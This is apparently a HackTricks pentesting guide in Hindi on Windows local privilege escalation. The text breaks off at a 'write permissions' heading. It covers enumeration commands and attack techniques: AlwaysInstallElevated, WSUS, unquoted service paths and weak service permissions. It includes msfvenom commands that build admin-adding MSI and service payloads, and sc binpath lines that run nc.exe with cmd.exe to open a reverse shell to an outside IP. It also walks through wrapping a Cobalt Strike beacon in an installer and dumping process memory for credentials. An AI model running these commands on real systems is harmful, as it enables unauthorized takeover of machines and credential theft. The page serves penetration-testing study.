# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं तो आगे बढ़ने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में ऐसी कई चीज़ें मौजूद हो सकती हैं जो आपको **prevent you from enumerating the system**, executables चलाने से रोक सकती हैं या यहां तक कि आपकी गतिविधियों को **detect your activities** कर सकती हैं। आपको privilege escalation enumeration शुरू करने से पहले निम्न **page** को **read** करके इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## सिस्टम जानकारी

### Version info enumeration

जाँचें कि क्या Windows संस्करण में कोई ज्ञात vulnerability है (लागू किए गए patches भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो एक Windows वातावरण द्वारा प्रस्तुत किए गए **massive attack surface** को दर्शाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**लोकल सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy info env variables में saved है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

इसे कैसे चालू करें यह आप इस लिंक पर जाकर सीख सकते हैं: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादन का विवरण रिकॉर्ड किया जाता है, जिसमें चलाए गए कमांड, कमांड कॉल/इनवोकेशन्स, और स्क्रिप्ट के हिस्से शामिल होते हैं। हालाँकि, पूरी निष्पादन जानकारी और आउटपुट परिणाम कैप्चर नहीं हो सकते।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** की जगह चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से आखिरी 15 events देखने के लिए आप निम्नलिखित चलाकर देख सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की संपूर्ण गतिविधि और पूर्ण सामग्री रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का प्रत्येक ब्लॉक चलते समय दस्तावेज़ित हो। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो forensics और malicious behavior के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों का दस्तावेज़ीकरण करके प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग ईवेंट्स Windows Event Viewer में इस पथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
आखिरी 20 इवेंट देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट http**S** के बजाय http के माध्यम से अनुरोधित किए जा रहे हैं तो आप सिस्टम को समझौता कर सकते हैं।

आप cmd में निम्नलिखित चलाकर यह जाँच करके शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी एक जैसा उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और अगर `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` के समान है। 

तो, **it is exploitable.** यदि अंतिम registry का मान 0 के समान है, तो WSUS entry को अनदेखा कर दिया जाएगा।

इन vulnerabilities को exploit करने के लिए आप इन tools का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS traffic में 'fake' updates इंजेक्ट करते हैं।

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूर्ण रिपोर्ट यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
सारांश में, यह वह flaw है जिसका यह bug exploits:

> यदि हमारे पास अपने local user proxy को modify करने की क्षमता है, और Windows Updates Internet Explorer के settings में configured proxy का उपयोग करता है, तो हम स्थानीय रूप से [PyWSUS](https://github.com/GoSecure/pywsus) चला कर अपनी ही traffic को intercept कर सकते हैं और अपने asset पर एक elevated user के रूप में code चला सकते हैं।
>
> इसके अलावा, चूंकि WSUS service current user की settings का उपयोग करती है, यह current user के certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate generate करें और इस certificate को current user के certificate store में जोड़ दें, तो हम HTTP और HTTPS दोनों WSUS traffic को intercept कर पाएंगे। WSUS certificate पर trust-on-first-use प्रकार की validation लागू करने के लिए किसी HSTS-like mechanism का उपयोग नहीं करता। यदि प्रस्तुत certificate user द्वारा trusted है और hostname सही है, तो service इसे स्वीकार कर लेगा।

आप इस vulnerability को tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग करके exploit कर सकते हैं (एक बार यह liberated हो जाने पर)।

## KrbRelayUp

एक **local privilege escalation** vulnerability Windows **domain** environments में कुछ विशिष्ट परिस्थितियों में मौजूद है। इन परिस्थितियों में शामिल हैं ऐसे environments जहाँ **LDAP signing is not enforced,** users के पास self-rights हों जो उन्हें **Resource-Based Constrained Delegation (RBCD)** configure करने की अनुमति दें, और users के पास domain में computers create करने की क्षमता हो। यह ध्यान रखने योग्य है कि ये **requirements** **default settings** का उपयोग करके पूरी हो जाती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

attack के flow के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** ये 2 registers **enabled** हैं (मान **0x1**), तो किसी भी privilege के users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास meterpreter session है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

power-up से `Write-UserAddMSI` कमांड का उपयोग करके वर्तमान डायरेक्टरी में एक Windows MSI binary to escalate privileges बनाने के लिए बनाएं। यह स्क्रिप्ट एक precompiled MSI installer लिखती है जो user/group addition के लिए प्रॉम्प्ट करती है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
सिर्फ बनाए गए binary को execute करके privileges escalate करें।

### MSI Wrapper

इस tutorial को पढ़ें ताकि आप MSI wrapper बनाना सीख सकें। नोट करें कि आप एक **.bat** फ़ाइल wrap कर सकते हैं अगर आप **just** **execute** **command lines** करना चाहते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** Cobalt Strike या Metasploit के साथ एक **नया Windows EXE TCP payload** `C:\privesc\beacon.exe` में बनाएं
- Open **Visual Studio**, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को कोई नाम दें, जैसे **AlwaysPrivesc**, लोकेशन के लिए **`C:\privesc`** इस्तेमाल करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- जब तक आप step 3 of 4 (choose files to include) तक न पहुंचें, तब तक **Next** पर क्लिक करते रहें। **Add** पर क्लिक करें और हाल में generate किया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- Solution Explorer में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो installed app को अधिक legitimate दिखा सकते हैं।
- प्रोजेक्ट पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे installer रन होते ही beacon payload execute होगा।
- **Custom Action Properties** के तहत **Run64Bit** को **True** में बदलें।
- अंत में, **build** करें।
- यदि यह warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखे, तो सुनिश्चित करें कि आपने platform को x64 सेट किया है।

### MSI Installation

malicious `.msi` फ़ाइल की **installation** को **background** में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability को exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं।
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** का उद्देश्य स्थानीय Administrator पासवर्ड का प्रबंधन है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड डोमेन से जुड़े कंप्यूटरों पर **अद्वितीय, यादृच्छिक, और नियमित रूप से अपडेट** होता है। ये पासवर्ड Active Directory के भीतर सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions दिए गए हों, जिससे वे अधिकृत होने पर स्थानीय admin पासवर्ड देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text पासवर्ड LSASS में संग्रहीत होते हैं** (Local Security Authority Subsystem Service).\
[**इस पृष्ठ में WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA सुरक्षा

Windows 8.1 से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अनविश्वसनीय प्रक्रियाओं द्वारा **इसकी मेमोरी पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **ब्लॉक** किया जा सके, जिससे सिस्टम और अधिक सुरक्षित हो।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है।| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता का logon डेटा किसी पंजीकृत security package द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों की सूची बनाएं

आपको यह जांचना चाहिए कि जिन समूहों का आप हिस्सा हैं उनमें से किसी के पास कोई रोचक अनुमतियाँ हैं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

यदि आप **किसी विशेषाधिकार समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार समूहों और उन्हें दुरुपयोग करके विशेषाधिकार कैसे बढ़ाए जा सकते हैं इसके बारे में यहां जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token हेरफेर

**और जानें** कि **token** क्या है इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **दिलचस्प tokens** और उन्हें कैसे दुरुपयोग किया जा सकता है सीख सकें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग किए गए उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रोसेस

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, processes सूचीबद्ध करते समय **command line के अंदर passwords देखें**.\
जांचें कि क्या आप **किसी चल रहे binary को overwrite कर सकते हैं** या क्या आपके पास binary फ़ोल्डर की write permissions हैं ताकि आप संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का शोषण कर सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभवतः [**electron/cef/chromium debuggers** चल रहे हों — आप इसका दुरुपयोग करके escalate privileges हासिल कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**processes binaries के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**process binaries के फ़ोल्डरों के permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप sysinternals के **procdump** का उपयोग करके चल रहे process का मेमोरी डंप बना सकते हैं। FTP जैसे services की **credentials in clear text in memory** होती हैं; मेमोरी को डंप करके उन credentials को पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले एप्लिकेशन उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## सेवाएँ

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
प्रत्येक service के लिए आवश्यक privilege स्तर की जाँच के लिए _Sysinternals_ का binary **accesschk** होना सलाह दी जाती है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
अनुशंसा की जाती है कि जाँचें कि "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि आ रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे सक्षम करने के लिए निम्न का उपयोग कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि service upnphost काम करने के लिए SSDPSRV पर निर्भर करता है (XP SP1 के लिए)**

**Another workaround** इस समस्या का एक अन्य तरीका है जिसे चलाया जा सकता है:
```
sc.exe config usosvc start= auto
```
### **सेवा के बाइनरी पथ को संशोधित करें**

ऐसी स्थिति में जहाँ "Authenticated users" समूह के पास किसी सेवा पर **SERVICE_ALL_ACCESS** है, सेवा के executable बाइनरी में संशोधन संभव है। सेवा बाइनरी को संशोधित करने और चलाने के लिए **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges को विभिन्न permissions के माध्यम से escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership प्राप्त करने और permission reconfiguration की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता देता है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी देता है।

इस vulnerability के detection और exploitation के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries कमजोर permissions

**Check करें कि आप उस binary को modify कर सकते हैं जो किसी service द्वारा execute की जाती है** या अगर आपके पास **उस folder पर write permissions हैं** जहाँ binary स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप किसी service द्वारा execute किए जाने वाले हर binary को **wmic** का उपयोग करके प्राप्त कर सकते हैं (not in system32) और अपनी permissions **icacls** का उपयोग करके जांच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का उपयोग भी कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry को संशोधित करने की अनुमतियाँ

आपको यह जांचना चाहिए कि क्या आप किसी भी service registry को संशोधित कर सकते हैं.\
आप निम्नलिखित करके किसी service **registry** पर अपनी **permissions** **check** कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जाँचना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` अनुमतियाँ हैं। यदि हाँ, तो सर्विस द्वारा निष्पादित बाइनरी को बदला जा सकता है।

निष्पादित बाइनरी के पथ को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इस registry से sub registries बना सकते हैं**। Windows services के मामले में यह **enough to execute arbitrary code:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes में न दिया गया हो, तो Windows space से पहले आने वाले प्रत्येक हिस्से को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित को execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
बिल्ट-इन Windows सेवाओं से संबंधित नहीं होने वाले सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability का पता लगा सकते हैं और exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted_service_path` आप metasploit से मैन्युअल रूप से एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई service fail हो तो कौन-सी actions ली जाएँ। इस feature को एक binary की ओर point करने के लिए configure किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [आधिकारिक दस्तावेज़](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिलती है।

## Applications

### Installed Applications

जाँचें **permissions of the binaries** (शायद आप किसी को overwrite कर सकें और escalate privileges) और **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ
